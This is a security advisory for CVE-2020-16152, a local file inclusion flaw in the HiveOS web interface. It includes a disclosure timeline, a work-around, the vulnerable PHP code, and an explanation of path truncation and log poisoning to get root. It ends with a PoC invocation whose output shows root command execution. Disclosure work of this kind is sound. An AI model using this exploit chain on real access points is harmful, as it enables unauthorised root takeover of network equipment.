# CVE-2020-16152

## Summary
|      []()       |                                          |
| --------------- | ---------------------------------------- |
| Product vendor  | Aerohive Networks / Extreme Networks     |
| Product name    | HiveOS / IQ Engine                       |
| Product Version | Tested on 10.0r8a build-242466 and older |

The Aerohive/Extreme Networks HiveOS administrative webinterface (_NetConfig_) is vulnerable to LFI because it uses an old version of PHP vulnerable to string truncation attacks. An attacker is able to use this in conjunction with log poisoning to gain _root_ rights on a vulnerable access point.

As a work-around it is possible to disable the web interface with the following command: `no system web-server hive-UI enable` to protect against this vulnerability.

## Disclosure timeline:
|      []()       |                                          |
| --------------- | ---------------------------------------- |
| 2019/02/17 | Issue was reported to Aerohive Networks |
| 2019/02/19 | Acknowledgement issue was received by vendor, work around suggested by vendor (disable web interface) |
| 2019/02/25 | Confirmation of issue by vendor |
| 2019/03/18 | Ping? |
| 2019/05/30 | Ping? |
| 2019/06/03 | Vendor suggests a phonecall, replied with phone details. No call was received |
| 2019/08/12 | Ping? Vendor replied issue is escalated internally |
| 2019/09/23 | Ping? |
| 2019/09/25 | Vendor replies the LFI issue has not been addressed yet |
| 2020/07/30 | Found issue is still not fixed in HiveOS 10.0r8a build-242466 which dates from 05/2020. Reserved CVE and communicated 2020/09/01 deadline for publication unless a fix is actively being worked on |
| 2020/09/01 | Still no reply from vendor, release of details and PoC |

## Details
The `_page` parameter used for calls to `action/AhBaseAction.class.php5` as referenced by url `/action.php5` is used to dynamically load a PHP class that is used for a page as we can see in the code snippet below (`$pageName` is taken from `$_POST['_page']`):
```php
protected function getAccess($pageName,$actionType) {
  $filename = $pageName.'Access.class.php5';
  $classname = $pageName.'Access';
  if (include_once $filename) {
    require_once $filename;
    return new $classname($this->user,$actionType);
  }
  ...
}
```
As we can see there is no prefix for this filename making is possible to traverse path to arbitrary files. However because we're presented with a suffix it's not possible to include just any file. Since the version of PHP on the access point is quite old, we can actually work around this ([more info)](https://www.ush.it/2009/02/08/php-filesystem-attack-vectors/):
```
$ php-cgi -v
PHP Warning:  PHP Startup: Cannot dynamically load sockets.so - dynamic modules are not supported in Unknown on line 0
PHP 5.2.17 (cgi-fcgi) (built: May 28 2020 23:36:34)
Copyright (c) 1997-2010 The PHP Group
Zend Engine v2.2.0, Copyright (c) 1998-2010 Zend Technologies
```
By filling the path with enough `/` characters we can make sure the `Access.class.php5` suffix is completely truncated and are free to include arbitrary files.
Because failed login attempts are logged to `/tmp/messages` and include the submitted username we can use the login page to poison `/tmp/messages` and then run code from it with the LFI attack listed above.
Although the webserver itself is running a low privileged user the `php-cgi` instance used by `hiawatha` is actually running as _root_ which means all php code is executed as root:
```
$ ps | egrep "php|hiawatha"
 2237 root      9980 S    /usr/local/bin/php-cgi -b 127.0.0.1:2008
12088 admin    20840 S    /usr/local/sbin/hiawatha
```

## PoC
```
$ ./CVE-2020-16152.py 192.168.0.166 'echo -e "\n\n";id' | tail
2020-08-30 13:56:28 notice  root: ntpclient: [ntpclient]Set time - Sun Aug 30 13:56:28 GMT+1:00 2020
2020-08-30 13:56:28 notice  root: Connect [0.aerohive.pool.ntp.org] successful
2020-08-30 13:56:54 info    ah_dcd: application: get track-ip trigger access console request: cancel.
2020-08-30 13:57:00 notice  root: ntpclient: [ntpclient]Set time - Sun Aug 30 13:57:00 GMT+1:00 2020
2020-08-30 13:57:00 notice  root: Connect [0.aerohive.pool.ntp.org] successful
2020-08-30 13:57:31 notice  ah_webui: security: Admin "<


uid=0(root) gid=0(root)

```